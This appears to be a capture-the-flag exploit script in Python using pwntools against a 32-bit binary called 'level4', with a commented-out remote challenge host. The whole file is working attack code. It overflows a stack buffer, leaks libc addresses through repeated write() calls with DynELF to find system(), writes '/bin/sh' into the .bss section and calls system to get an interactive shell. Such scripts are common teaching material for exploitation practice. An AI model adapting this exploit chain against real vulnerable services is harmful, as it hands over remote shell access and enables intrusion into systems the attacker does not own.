from pwn import *

# io = remote('pwn2.jarvisoj.com', '9880')
io = process('level4')
e = ELF('level4')
vulner_addr = e.symbols['vulnerable_function']
write_plt_addr = e.symbols['write']


def leak(address):
    payload = flat(junk, write_plt_addr, vulner_addr, 1, address, 4)
    io.sendline(payload)
    leak_sysaddr = io.recv(4)
    # print("%#x => %s" % (address, (leak_sysaddr or '')))  # 这里是测试用，可省略。
    return leak_sysaddr



junk = (0x88 + 4) * b'a'
d = DynELF(leak, elf=ELF("level4"))
system_addr = d.lookup("system", "libc")

read_plt_addr = e.symbols['read']
bss_addr = 0x0804A024

payload1 = flat(junk, read_plt_addr, vulner_addr, 0, bss_addr, 8)
io.sendline(payload1)
io.send('/bin/sh')

payload2 = flat(junk, system_addr, 0xdeadbeef, bss_addr)
io.sendline(payload2)
io.interactive()
